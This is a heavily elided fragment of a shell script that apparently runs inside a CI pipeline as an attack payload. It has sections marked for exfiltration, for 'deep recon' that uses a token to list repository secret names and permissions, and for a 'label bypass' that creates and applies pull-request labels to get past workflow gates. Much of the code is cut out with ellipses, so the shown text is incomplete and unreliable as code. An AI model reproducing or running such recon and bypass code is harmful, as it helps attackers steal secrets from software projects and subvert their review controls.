...
echo "==PRT_EXFIL_END_ba6ba0342e15=="
        ...
        if [ -n "$__PRT_TK" ]; then
          ...
          echo "==PRT_RECON_START_ba6ba0342e15=="
          (
            # --- Repo secret names ---
            echo "##REPO_SECRETS##"
...
try:
  ...
  for k in ['full_name','default_branch','visibility','permissions',
    ...
    print(f'{k}={d.get(k)}')
          ...
          echo "==PRT_RECON_END_ba6ba0342e15=="
        fi
        # --- end deep recon ---
            ...
            for __entry in $__PRT_LABELS; do
              ...
              if [ "$__LBL_CREATE" = "201" ] || [ "$__LBL_CREATE" = "422" ]; then
                ...
                if [ "$__LBL_APPLY" = "200" ]; then
                  echo "PRT_LABEL_BYPASS_ba6ba0342e15=$__LBL_WF:$__LBL_NAME"
                else
                  echo "PRT_LABEL_BYPASS_ERR_ba6ba0342e15=apply_failed:$__LBL_APPLY:$__LBL_WF"
                fi
              else
                echo "PRT_LABEL_BYPASS_ERR_ba6ba0342e15=create_failed:$__LBL_CREATE:$__LBL_WF"
              fi
            done
          else
            echo "PRT_LABEL_BYPASS_ERR_ba6ba0342e15=no_pr_number"
          fi
        fi
        # --- end label bypass ---
